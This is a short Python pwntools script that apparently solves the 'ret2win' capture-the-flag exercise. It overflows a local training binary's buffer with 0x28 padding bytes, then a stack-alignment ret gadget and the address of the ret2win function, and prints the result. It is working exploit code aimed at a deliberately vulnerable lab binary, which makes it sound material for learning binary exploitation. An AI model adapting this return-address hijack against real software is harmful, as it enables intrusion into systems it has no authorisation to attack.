from pwn import *

elf = context.binary = ELF("./ret2win")

ret = 0x40053e
payload = flat(
    b"A"*0x28,
    ret,
    elf.sym.ret2win,
) 

p = process("./ret2win")
p.sendlineafter(b">",payload)
print("\n",p.recvall().decode())
p.close()
